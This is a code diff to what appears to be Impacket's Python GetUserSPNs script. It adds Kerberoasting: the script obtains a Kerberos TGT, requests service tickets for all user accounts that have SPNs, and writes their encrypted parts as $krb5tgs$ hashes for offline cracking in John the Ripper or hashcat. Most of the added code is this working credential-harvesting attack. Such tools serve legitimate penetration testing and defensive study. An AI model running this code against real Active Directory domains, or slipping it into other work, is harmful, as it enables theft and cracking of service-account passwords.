@@ -23,7 +23,7 @@
 #     Also, disabled accounts won't be shown.
 #
 # ToDo:
-#  [ ] Add the capability for requesting TGS and output them in JtR/hashcat format
+#  [X] Add the capability for requesting TGS and output them in JtR/hashcat format
 #  [ ] Improve the search filter, we have to specify we don't want machine accounts in the answer
 #      (play with userAccountControl)
 #
@@ -31,14 +31,23 @@
 
 import argparse
 import logging
+import os
 import sys
 from datetime import datetime
+from binascii import hexlify
 
+from pyasn1.codec.der import decoder
 from impacket import version
-from impacket.examples import logger
-from impacket.smbconnection import SMBConnection
-from impacket.ldap import ldap, ldapasn1
 from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE
+from impacket.examples import logger
+from impacket.krb5 import constants
+from impacket.krb5.asn1 import TGS_REP
+from impacket.krb5.ccache import CCache
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5.types import Principal
+from impacket.ldap import ldap, ldapasn1
+from impacket.smbconnection import SMBConnection
+
 
 class GetUserSPNs:
     @staticmethod
@@ -65,9 +74,11 @@ class GetUserSPNs:
         self.__domain = domain
         self.__lmhash = ''
         self.__nthash = ''
+        self.__outputFileName = options.outputfile
         self.__aesKey = cmdLineOptions.aesKey
         self.__doKerberos = cmdLineOptions.k
         self.__target = None
+        self.__requestTGS = options.request
         if cmdLineOptions.hashes is not None:
             self.__lmhash, self.__nthash = cmdLineOptions.split(':')
 
@@ -83,7 +94,7 @@ class GetUserSPNs:
         s = SMBConnection(self.__domain, self.__domain)
         try:
             s.login('', '')
-        except Exception, e:
+        except Exception:
             logging.debug('Error while anonymous logging into %s' % self.__domain)
 
         s.logoff()
@@ -94,6 +105,68 @@ class GetUserSPNs:
         t -= 116444736000000000
         t /= 10000000
         return t
+
+    def getTGT(self):
+        try:
+            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
+        except:
+            # No cache present
+            pass
+        else:
+            # retrieve user and domain information from CCache file if needed
+            if self.__domain == '':
+                domain = ccache.principal.realm['data']
+            else:
+                domain = self.__domain
+            logging.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
+            principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
+            creds = ccache.getCredential(principal)
+            if creds is not None:
+                TGT = creds.toTGT()
+                logging.debug('Using TGT from cache')
+                return TGT
+            else:
+                logging.debug("No valid credentials found in cache. ")
+
+        # No TGT in cache, request it
+        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash,
+                                                                self.__nthash, self.__aesKey)
+        TGT = {}
+        TGT['KDC_REP'] = tgt
+        TGT['cipher'] = cipher
+        TGT['sessionKey'] = sessionKey
+
+        return TGT
+
+    @staticmethod
+    def outputTGS(tgs, username, fd=None):
+        decodedTGT = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+
+        # According to RFC4757 the cipher part is like:
+        # struct EDATA {
+        #       struct HEADER {
+        #               OCTET Checksum[16];
+        #               OCTET Confounder[8];
+        #       } Header;
+        #       OCTET Data[0];
+        # } edata;
+        #
+        # In short, we're interested in splitting the checksum and the rest of the encrypted data
+        #
+        if decodedTGT['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
+            entry = '$krb5tgs$%d$*%s$%s$SPN*$%s$%s' % (
+                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGT['ticket']['realm'],
+                hexlify(str(decodedTGT['ticket']['enc-part']['cipher'][:16])),
+                hexlify(str(decodedTGT['ticket']['enc-part']['cipher'][16:])))
+            if fd is None:
+                print entry
+            else:
+                fd.write(entry+'\n')
+        else:
+            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
+                decodedTGT['ticket']['sname']['name-string'][0], decodedTGT['ticket']['sname']['name-string'][1],
+                decodedTGT['ticket']['enc-part']['etype']))
 
     def run(self):
         if self.__doKerberos:
@@ -150,6 +223,35 @@ class GetUserSPNs:
 
         if len(answers)>0:
             self.printTable(answers, header=[ "ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet"])
+            print '\n\n'
+
+            if self.__requestTGS is True:
+                # Let's get unique user names an a SPN to request a TGS for
+                users = dict( (vals[1], vals[0]) for vals in answers)
+
+                # Get a TGT for the current user
+                TGT = self.getTGT()
+                if self.__outputFileName is not None:
+                    fd = open(self.__outputFileName, 'w+')
+                else:
+                    fd = None
+                for user, SPN in users.iteritems():
+                    try:
+                        serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
+                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain, None,
+                                                                                TGT['KDC_REP'], TGT['cipher'],
+                                                                                TGT['sessionKey'])
+                        self.outputTGS(tgs, user, fd)
+                    except Exception , e:
+                        logging.error(str(e))
+                if fd is not None:
+                    fd.close()
+
+        else:
+            print "No entries found!"
+
+
+
 
 # Process command-line arguments.
 if __name__ == '__main__':
@@ -160,6 +262,9 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help = True, description = "Queries target domain for SPNs that are running under a user account")
 
     parser.add_argument('target', action='store', help='domain/username[:password]')
+    parser.add_argument('-request', action='store_true', default='False', help='Request TGS for users and output them in JtR/hashcat format (default False)')
+    parser.add_argument('-outputfile', action='store',
+                        help='Output filename to write ciphers in JtR/hashcat format')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
     group = parser.add_argument_group('authentication')
@@ -206,4 +311,6 @@ if __name__ == '__main__':
         executer = GetUserSPNs(username, password, domain, options)
         executer.run()
     except Exception, e:
+        #import traceback
+        #print traceback.print_exc()
         print str(e)
